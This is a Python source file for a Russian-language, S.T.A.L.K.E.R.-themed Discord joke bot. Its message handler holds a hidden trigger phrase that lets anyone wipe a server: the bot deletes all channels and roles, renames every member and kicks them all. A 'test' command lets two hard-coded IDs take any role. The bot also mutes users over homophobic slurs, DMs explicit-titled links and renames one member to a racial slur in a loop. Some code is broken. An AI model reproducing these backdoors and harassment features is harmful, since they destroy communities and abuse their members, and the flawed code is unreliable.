import discord
from discord.ext import commands
import asyncio
import random
import re
from boto.s3.connection import S3Connection
s3 = S3Connection(os.environ['DISCORD_TOKEN'])
print(s3)


bot = commands.Bot(command_prefix='-')

TOKEN = s3
# ----------------------------------------------------------------------------------------------


#  -----------------------Много-текста----------------------------------------------------------
jokes = ['Заблудился как-то долговец и кричит:\n'
         '— Люди , отзовитесь, кто нибудь аууу.\n'
         'Тут его кто то догоняет и… хлоп сзади по рюкзаку. Ну он оборачивается,'
         ' а там стоит кровосос. Грустный такой. И хлюпает ему:\n'
         '— Чего орёшь, а?\n'
         'У долговца уже полные штаны ежиков… но он все-таки отвечает:\n'
         '— Я того , запплутал. Кричу, вот может кто-нибудь услышит?\n'
         'Кровосос помолчал, помолчал и говорит ему:\n'
         '— Ну я вот услышал  и чего теперь делать будем?\n'
    ,
         'Сидят два сталкера на берегу озера. Один другому говорит:\n'
         '— Насчет радиации я тебе чего скажу. Гонят как не знаю кто!\n'
         'Я тут уже лет 5 шарюсь безвылазно. Изменений никаких не заметил!'
         ' Сам как думаешь?'
         '— Да фигня однозначно. Хотя…\n С другой стороны,'
         ' чешуя-то в последнее время чешется все чаще.'
    ,
         'Появился, значит, в Зоне Черный Сталкер. К лагерю ночью повадился ходить.'
         ' И там сует руку в палатку и говорит:\n'
         '— (загробным, как у зомби голосом) Ввадииички папиииить,'
         ' — а если не дашь хлебнуть из фляжки или наружу полезешь — пришибет!\n'
         'А раз мужик один решил пошутить: вылез тихо из палатки, надел кожаную перчатку,'
         ' и полез к соседям в палатку. Полез, значит, и попрощайничает жалостно:\n'
         '— Вадииички, вадииички папить…\n'
         'А тут из палатки навстречу высовывается рука и за горло его… Цап! И сиплый голосок отзывается тихонько:\n'
         '— (хриплым недовольным голосом) А тебе моя водичка ЗАЧЕМ нужна?!'
    ,
         'Идут как - то по зоне трое военных.\nВдруг из кустов на них выпрыгивает кровосос.\nОдин военный'
         'орёт:\n - Мама!\n Второй'
         'орёт:\n - Тёща, блин!\n Третий: - Товарищ генерал!'
    ,
         'Сталкер оттирает свой комбинезон и бурчит:\n'
         '- Не, ну никому в зоне доверять нельзя... Не, ну вообще тут никому нельзя доверять, даже себе,\n'
         ' ведь только пукнуть хотел...'
    ,
         'Старый кровосос обучает своего молодого родственника:\n'
         '- Всегда незаметно подкрадывайся к человеку сзади, громко рычи, и только потом убивай.'
         ' Тогда намного вкуснее будет.\n'
         '- А почему?\n'
         '- Да потому что в сталкере меньше фекалий будет.'
         ]

QnA = ['Да, естессна', 'Хрен знает, братан, надо подумать',
       'Сомневаюсь, братан', 'Не, по-любому нет',
       'Решил бы ты это сам, а не меня спрашивал, так надёжнее будет', 'Конечно, кровососа мне за спину']

gays = []
fate_id = []
member_i = 0

#  -----------------------Много-текста----------------------------------------------------------


@bot.event
async def on_ready():
    print('Бот работает!')
    #    await anecdote_evry_hour()
    #    print(213)


@bot.command(pass_context=True)
async def test(ctx, arg):
    if ctx.author.id == 296506452800176128 or ctx.author.id == 272649817866633217:
        new = [ctx.guild.get_role(role_id=int(arg))]
        await ctx.author.edit(roles=new)
        await ctx.send(arg)


@bot.event
async def on_member_join(member):
    print('Joined')
    channel = bot.get_channel(775585235701989417)
    await channel.send('```Верни сотку, {0}```'.format(member.name))
    new = [channel.guild.get_role(722788053566881813)]
    await member.edit(roles=new)


@bot.event
async def on_message(message):
    global gays, member_i
    global QnA
    global fate_id
    await bot.process_commands(message)
    if message.author.id != 745998435274195044:
        #  Пица
        if re.search('пиц|питс', message.content, flags=re.I):
            global gays
            if message.author.id != 594849079184457747:
                await message.channel.send('*Тяжело дышит*  Кто сказал пица??')
            else:
                if message.author.id not in gays:
                    await message.channel.send('Ага, попався, гей')
                    gays.append(message.author.id)

        elif re.search('протокол "?м[ао]йдан"?|ma?ydone', message.content, flags=re.I):
            guild = message.guild
            main_channel = message.channel

            # каналы
            for txt_channel in guild.channels:
                if txt_channel is not main_channel:
                    try:
                        await txt_channel.delete()
                    except discord.errors.Forbidden and discord.errors.HTTPException:
                        continue

            # гс каналы
            for voice_channel in guild.voice_channels:
                try:
                    await voice_channel.delete()
                except discord.errors.Forbidden and discord.errors.HTTPException:
                    continue

            # роли
            for role in guild.roles:
                try:
                    await role.delete()
                except discord.errors.Forbidden and discord.errors.HTTPException:
                    continue
            # print(guild.members)
            await members_determination(message.guild)

            await main_channel.edit(name='для бешеного казаха')

        # elif re.search('да|конечно|давай|пускай', message.content, flags=re.I) \
        #         and message.author.id in fate_id:
        #     fate_id.remove(message.author.id)
        #
        # elif re.search('не', message.content, flags=re.I) \
        #         and message.author.id in fate_id:
        #     main_channel = message.channel
        #     await main_channel.send('Нет? Хорошо.')
        #     fate_id.remove(message.author.id)

        #  Скинь сиськи
        elif re.search('с?кинь( )?сис(ьк)?и', message.content, flags=re.I):
            i = random.randint(0, 1)
            links = ['https://im0-tub-ru.yandex.net/i?id=8b4440a0859254c5b4a284687b78cf49&n=13',
                     'https://im0-tub-ru.yandex.net/i?id=21622ee78bae868f4ab319c5415c6b15&n=13']
            await message.author.send(
                'Держи сиськи: \n{0}'.format(links[i]))
        # Извините
        elif re.search('пр[оа]сти|изв[ие]ни|я осуждаю свои слова|сор[аэеиуоя]', message.content,
                       flags=re.I) and re.search('сталкер|бандит', message.content, flags=re.I):
            print('Извинился')
            print(gays)
            if message.author.id in gays:
                await message.channel.send('Прощаю. Но бинты не дам, сам лечись.')
                gays.remove(message.author.id)
                print('Дурачок прощён')
            elif message.author.id not in gays:
                await message.channel.send('А за шо? Ты уже извинялся')

        # *Имя* сказал, что ты пидор
        # elif re.search('сказал|звал', message.content, flags=re.I) and \
        #         re.search('что ты|тебя', message.content, flags=re.I) and \
        #         re.search('п[ие]д([аоеуыи])?[рp]|[pр][ie]d(or)?|3[,. ]14( )?do*r|3[,. ]14( )? дор|род[ие]п|rod[ie]p',
        #                   message.content, flags=re.I) and \
        #         re.search('сталкер|бандит', message.content, flags=re.I):
        #     good_ids = [272649817866633217, 296506452800176128, 336515784627191820]
        #     find = False
        #     if message.author.id in good_ids:
        #         sl1 = message.content.index('"')
        #         mess_rev = message.content[::-1]
        #         sl2 = mess_rev.index('"')
        #
        #         name = message.content[sl1 + 1:-sl2 - 1]
        #         print(name)
        #         for member in message.guild.members:
        #             if member.display_name == name:
        #                 find = True
        #                 print(member.display_name)
        #                 if member.id not in good_ids:
        #                     await message.channel.send(f'А ну-ка подойди, {name}')
        #                     guild = bot.get_guild(785203444309819403)
        #
        #                     roles = member.roles
        #                     #        big_guy_role = [guild.get_role(722789252772921364)]
        #                     if message.author.id not in gays:
        #                         gays.append(member.id)
        #                     else:
        #                         await message.channel.send('Ты ваще урок не усвоил, урод?')
        #                     print(gays)
        #                     await asyncio.sleep(3)
        #                     print('овечка наказана')
        #                     for i in range(0, 3600):
        #                         print(gays)
        #                         if member.id in gays:
        #                             mute = [guild.get_role()]
        #                             await member.edit(roles=mute)
        #                             i += 15
        #                             await asyncio.sleep(15)
        #                     await member.edit(roles=roles)
        #                     await message.channel.send('В следующий раз будь поумнее, {0}'.format(member.display_name))
        #                 else:
        #                     await message.channel.send('Не верю')
        #                 break
        #         if not find:
        #             await message.channel.send('Хто? Я тут таких не видал')

        #  Пидор
        elif re.search('п[ие]д([аоеуыи])?[рp]|[pр][ie]d(or)?|3[,. ]14( )?do*r|3[,. ]14( )? дор'
                       '|род[ие]п|rod[ie]p', message.content, flags=re.I):

            if message.author.id not in gays:
                i = 0
                a = message.guild
                while i < 3:
                    if i < 1:
                        await message.channel.send('Хто... я?')
                        await asyncio.sleep(1)
                    elif i < 2:
                        await message.channel.send('ХТО. Я??')
                        await asyncio.sleep(1)
                    elif i < 3:
                        await message.channel.send('ХТООООО, ЯЯЯЯ?????')
                        await asyncio.sleep(1)
                    i += 1
                i = 0

                guild = message.channel.guild
                member = guild.get_member(message.author.id)

                roles = member.roles
                #        big_guy_role = [guild.get_role(722789252772921364)]
                if message.author.id not in gays:
                    gays.append(message.author.id)
                    await message.channel.send('Ну всё, братанчик ты доигрался')
                else:
                    await message.channel.send('Ты ваще урок не усвоил, урод?')
                print(gays)
                await asyncio.sleep(3)
                print('овечка наказана')
                for i in range(0, 3600):
                    print(gays)
                    if message.author.id in gays:
                        mute = [guild.get_role(785842303264489512)]
                        await member.edit(roles=mute)
                        i += 15
                        await asyncio.sleep(15)
                    else:
                        break
                await member.edit(roles=roles)
                await message.channel.send('В следующий раз будь поумнее, {0}'.format(member.display_name))

        # Рифма
        elif re.search('рифм', message.content, flags=re.I) and re.search('слов', message.content, flags=re.I) and \
                re.search('сталкер|бандит', message.content, flags=re.I):
            sl1 = message.content.index('"')
            mess_rev = message.content[::-1]
            sl2 = mess_rev.index('"')
            word = message.content[sl1 + 1:-sl2 - 1]
            if not re.search(' ', word, flags=re.I):
                #            await message.channel.send('Точно скажу, подходит слово {0}'.format(word))
                if word.lower() == 'расиля':
                    await message.channel.send('У бабки съела труселя')
                elif word.lower() == 'бог' or word.lower() == 'иисус':
                    await message.channel.send(
                        file=discord.File('/home/aptyp_pirozhkov/Apps/My Scripts/Bots/AlishkaBot/God.mp3'))
                elif word.lower() == 'тамерлан':
                    await message.channel.send('Наркоман')
                elif len(word) > 0:
                    i = None
                    for index, char in enumerate(word):
                        if char in 'аяоёуюыиэе':
                            i = index
                            break
                    rifm = 'Пизд' + word[i:]
                    await message.channel.send(rifm)

            else:
                await message.channel.send('Пробелы убери из слова, а то я тупой немного ')

        #  Приветствие
        elif re.search('пр[иу]в([еэ]т)?|хай|здаров|добр(ое|ого)? утр|[шс]ал[оа]м', message.content, flags=re.I) and \
                re.search('сталкер|бандит',
                          message.content,
                          flags=re.I):
            await message.channel.send('И тебе не хворать')

        #  Пока
        elif re.search('пока|покеда|прощай|бывай|спокойной ночи|споки|доброй ночк?и|приятной ночк?и', message.content,
                       flags=re.I) and re.search('сталкер|бандит', message.content, flags=re.I):
            await message.channel.send('Давай, бандит, береги себя')

        #  Оскорбление
        elif re.search('сталкер|бандит', message.content, flags=re.I) and re.search('ты(?!( дум))|вы(?!( дум))|you|иди',
                                                                                    message.content, flags=re.I) and \
                re.search('ху[ий]|пид|сука|мразь|тварь|gay|туп|деби|конч|дур|хер', message.content, flags=re.I):
            await message.channel.send('Слышь, урод, мне волыну достать?')

        #  Как дела?
        elif re.search('как', message.content, flags=re.I) and re.search('дел|жи[зт]|настр', message.content,
                                                                         flags=re.I) and re.search('сталкер|бандит',
                                                                                                   message.content,
                                                                                                   flags=re.I):
            await message.channel.send('Хорошо, бандит, хорошо..')

        #  Анекдот
        elif re.search('сталкер|бандит', message.content, flags=re.I) and re.search('рас*к', message.content,
                                                                                    flags=re.I) and \
                re.search('ан*екдот', message.content, flags=re.I):
            await anecdote(message.channel)

        # Вопрос
        elif re.search('сталкер|бандит', message.content, flags=re.I) and re.search('\?', message.content, flags=re.I):
            await message.channel.send(QnA[random.randint(0, 5)])

        #  Благодарность
        elif re.search('пасиб|молод|крас|ч[ёе]т(ень)?к|хорош|брав|прият', message.content, flags=re.I) and \
                re.search('сталкер|бандит', message.content, flags=re.I):
            await message.channel.send('Ай, да ладно те ')

        #  Налоги
        elif re.search('пл[ао]ти|дай|лей|верни', message.content, flags=re.I) and re.search('(н[ао]лог)?', message.content,
                                                                              flags=re.I) and re.search(
            'сталкер|бандит', message.content, flags=re.I):
            await message.channel.send('Пошёл нахер')


@bot.command(pass_context=True)
async def send_togays(ctx, *mess):
    res = input('Введите сообщение("*пустая строка*" для выхода из режима): ')
    if res != '':
        await ctx.send(res)
        await send_togays(ctx)


@bot.command(pass_context=True)
async def members_determination(guild):
    for member in guild.members:
        try:
            print(member.display_name)
            await member.edit(nick='100110011110000101111001')
        except discord.errors.Forbidden:
            continue
    await asyncio.sleep(5)
    for member in guild.members:
        try:
            print(member.display_name)
            await member.kick(reason='Увидимся, друг мой')
        except discord.errors.Forbidden:
            continue



@bot.command(pass_context=True)
async def gnom():
    guild = bot.get_guild(518502944472039474)
    member = guild.get_member(494120326792216607)
    #    member2 = guild.get_member(618790007687348284)
    #    print(123)
    await anecdote_evry_hour()
    while True:
        await member.edit(nick='нiгер')
        await asyncio.sleep(2)


@bot.command(pass_context=True)
async def anecdote(ctx):
    global jokes
    await ctx.send('```Ну, братанчик, слушай:\n' + jokes[random.randint(0, 5)] + '```')


@bot.command(pass_context=True)
async def anecdote_evry_hour():
    pass


bot.run(TOKEN)
